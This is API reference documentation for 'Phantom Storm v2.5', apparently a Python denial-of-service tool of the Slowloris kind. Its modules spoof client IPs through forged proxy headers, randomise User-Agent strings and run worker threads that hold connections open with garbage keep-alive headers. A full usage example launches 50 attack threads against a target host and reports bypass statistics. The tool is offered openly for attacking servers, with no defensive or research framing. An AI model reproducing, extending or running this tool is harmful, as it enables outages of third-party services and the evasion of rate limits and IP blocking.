# 📖 API Reference - Phantom Storm v2.5

Complete API documentation for all modules.

---

## 📦 Module: `src.config`

Configuration constants used throughout the application.

### Constants

```python
USER_AGENTS: List[str]
```
Pool of User-Agent strings for randomization.

```python
PRIVATE_IP_RANGES: List[Tuple[int, ...]]
```
Private IP ranges to avoid when generating spoofed IPs.

```python
DEFAULT_TIMEOUT: int = 4
```
Default socket timeout in seconds.

```python
DEFAULT_KEEP_ALIVE_INTERVAL: int = 3
```
Default interval between sending garbage headers.

```python
STATS_UPDATE_INTERVAL: int = 2
```
Dashboard refresh interval in seconds.

---

## 🎨 Module: `src.utils.colors`

### Class: `Colors`

ANSI color codes for terminal output.

#### Class Attributes

```python
HEADER: str       # Purple
OKBLUE: str       # Blue
OKCYAN: str       # Cyan
OKGREEN: str      # Green
WARNING: str      # Yellow
FAIL: str         # Red
ENDC: str         # Reset
BOLD: str         # Bold text
UNDERLINE: str    # Underlined text
```

#### Methods

```python
@staticmethod
def disable() -> None
```
Disable all colors (useful for piping output to files).

**Example:**
```python
from src.utils import Colors

print(f"{Colors.OKGREEN}Success!{Colors.ENDC}")
Colors.disable()  # Disable colors for logging
```

---

## 📝 Module: `src.utils.logger`

### Function: `setup_logging`

```python
def setup_logging(log_file: Optional[str] = None) -> logging.Logger
```

Configure logging system with both console and file output.

**Parameters:**
- `log_file` (Optional[str]): Filename for log file (created in `logs/` directory)

**Returns:**
- `logging.Logger`: Configured logger instance

**Example:**
```python
from src.utils import setup_logging

logger = setup_logging("my_attack.log")
logger.info("Attack started")
```

---

## 🎭 Module: `src.core.ip_generator`

### Class: `IPGenerator`

Smart IP generator for spoofing attacks.

#### Static Methods

```python
@staticmethod
def is_private_ip(ip_tuple: Tuple[int, int, int, int]) -> bool
```

Check if IP address is in private/reserved range.

**Parameters:**
- `ip_tuple`: IP address as tuple (e.g., `(192, 168, 1, 1)`)

**Returns:**
- `bool`: True if IP is private/reserved

**Example:**
```python
from src.core import IPGenerator

is_priv = IPGenerator.is_private_ip((192, 168, 1, 1))
print(is_priv)  # True
```

---

```python
@staticmethod
def generate_public_ip() -> str
```

Generate random public IP address (avoids private ranges).

**Returns:**
- `str`: IP address (e.g., `"203.45.67.89"`)

**Example:**
```python
ip = IPGenerator.generate_public_ip()
print(ip)  # "203.45.67.89"
```

---

```python
@staticmethod
def generate_proxy_chain() -> str
```

Generate fake proxy chain for Via header.

**Returns:**
- `str`: Via header value (e.g., `"HTTP/1.1 203.45.67.89, HTTP/2.0 156.78.90.12"`)

**Example:**
```python
via = IPGenerator.generate_proxy_chain()
print(via)  # "HTTP/1.1 203.45.67.89, HTTP/2.0 156.78.90.12"
```

---

## 📊 Module: `src.core.statistics`

### Class: `AttackStatistics`

Thread-safe statistics tracker.

#### Methods

```python
def __init__() -> None
```

Initialize statistics tracker.

---

```python
def connection_established(spoofed_ip: Optional[str] = None) -> None
```

Record successful connection.

**Parameters:**
- `spoofed_ip` (Optional[str]): Spoofed IP used for this connection

**Example:**
```python
stats = AttackStatistics()
stats.connection_established("203.45.67.89")
```

---

```python
def connection_closed() -> None
```

Record closed connection.

---

```python
def connection_failed(error_type: str = "unknown") -> None
```

Record failed connection.

**Parameters:**
- `error_type` (str): Error type (e.g., "timeout", "ConnectionRefusedError")

---

```python
def packet_sent() -> None
```

Record packet sent.

---

```python
def get_stats() -> Dict[str, Any]
```

Get all current statistics.

**Returns:**
- `Dict`: Statistics dictionary with keys:
  - `runtime` (float): Total runtime in seconds
  - `connections_established` (int): Total successful connections
  - `connections_active` (int): Currently active connections
  - `connections_failed` (int): Total failed connections
  - `total_packets` (int): Total packets sent
  - `packets_per_second` (float): Average throughput
  - `success_rate` (float): Success percentage (0-100)
  - `unique_ips_used` (int): Number of unique spoofed IPs
  - `bypass_attempts` (int): Total bypass attempts
  - `bypass_diversity` (float): IP diversity percentage (0-100)
  - `error_types` (Dict[str, int]): Error counts by type

**Example:**
```python
stats = AttackStatistics()
# ... perform attack ...
final = stats.get_stats()
print(f"Success rate: {final['success_rate']:.2f}%")
```

---

```python
def reset() -> None
```

Reset all statistics to zero.

---

## ⚔️ Module: `src.core.attack_worker`

### Class: `AttackWorker`

Individual attack thread worker.

#### Constructor

```python
def __init__(
    target_ip: str,
    target_port: int,
    stats: AttackStatistics,
    worker_id: int,
    use_spoofing: bool = True,
    timeout: int = DEFAULT_TIMEOUT,
    keep_alive_interval: int = DEFAULT_KEEP_ALIVE_INTERVAL
) -> None
```

**Parameters:**
- `target_ip` (str): Target IP address
- `target_port` (int): Target port
- `stats` (AttackStatistics): Statistics tracker instance
- `worker_id` (int): Unique worker identifier
- `use_spoofing` (bool): Enable IP spoofing (default: True)
- `timeout` (int): Socket timeout in seconds (default: 4)
- `keep_alive_interval` (int): Seconds between garbage headers (default: 3)

**Example:**
```python
from src.core import AttackWorker, AttackStatistics

stats = AttackStatistics()
worker = AttackWorker(
    target_ip="192.168.1.100",
    target_port=80,
    stats=stats,
    worker_id=1,
    use_spoofing=True
)
```

#### Methods

```python
def run() -> None
```

Main worker loop. Establishes connection and sends keep-alive packets.

**Example:**
```python
import threading

worker = AttackWorker("192.168.1.100", 80, stats, 1)
thread = threading.Thread(target=worker.run, daemon=True)
thread.start()
```

---

```python
def stop() -> None
```

Stop the worker gracefully.

**Example:**
```python
worker.stop()  # Worker will exit loop and cleanup
```

---

```python
def build_http_request(spoofed_ip: Optional[str]) -> str
```

Build HTTP request with spoofing headers.

**Parameters:**
- `spoofed_ip` (Optional[str]): IP to spoof (None if disabled)

**Returns:**
- `str`: Complete HTTP request string

---

## 🎯 Complete Usage Example

```python
#!/usr/bin/env python3
"""Complete example using all modules"""

from src import (
    AttackWorker,
    AttackStatistics,
    IPGenerator,
    Colors,
    setup_logging,
    config
)
import threading
import time

def main():
    # Setup
    print(f"{Colors.OKGREEN}Starting attack...{Colors.ENDC}")
    setup_logging("my_attack.log")
    
    # Configuration
    target_ip = "192.168.1.100"
    target_port = 80
    threads_count = 50
    
    # Initialize stats
    stats = AttackStatistics()
    
    # Generate sample IPs
    print(f"{Colors.OKCYAN}Sample IPs:{Colors.ENDC}")
    for i in range(3):
        ip = IPGenerator.generate_public_ip()
        print(f"  {i+1}. {ip}")
    
    # Start workers
    workers = []
    for i in range(threads_count):
        worker = AttackWorker(
            target_ip=target_ip,
            target_port=target_port,
            stats=stats,
            worker_id=i,
            use_spoofing=True
        )
        thread = threading.Thread(target=worker.run, daemon=True)
        thread.start()
        workers.append(worker)
    
    # Run for 30 seconds
    try:
        time.sleep(30)
    except KeyboardInterrupt:
        pass
    
    # Stop
    for worker in workers:
        worker.stop()
    
    time.sleep(1)
    
    # Show results
    final_stats = stats.get_stats()
    print(f"\n{Colors.OKBLUE}=== FINAL STATS ==={Colors.ENDC}")
    print(f"Connections: {final_stats['connections_established']:,}")
    print(f"Success Rate: {final_stats['success_rate']:.2f}%")
    print(f"Unique IPs: {final_stats['unique_ips_used']:,}")
    print(f"IP Diversity: {final_stats['bypass_diversity']:.2f}%")

if __name__ == "__main__":
    main()
```

---

## 🧪 Testing

### Running Unit Tests

```bash
# Test IP Generator
cd tests
python test_ip_generator.py

# Test Statistics
python test_statistics.py
```

### Writing Custom Tests

```python
import sys
sys.path.insert(0, '..')

from src.core import IPGenerator

def test_custom():
    ip = IPGenerator.generate_public_ip()
    assert len(ip.split('.')) == 4
    print("Test passed!")

if __name__ == "__main__":
    test_custom()
```

---

## 📝 Notes

- All classes are thread-safe where applicable
- Statistics use locks for concurrent access
- IP Generator avoids private/reserved ranges automatically
- Colors can be disabled for file output

---

**Last Updated:** v2.5 Ultimate Edition
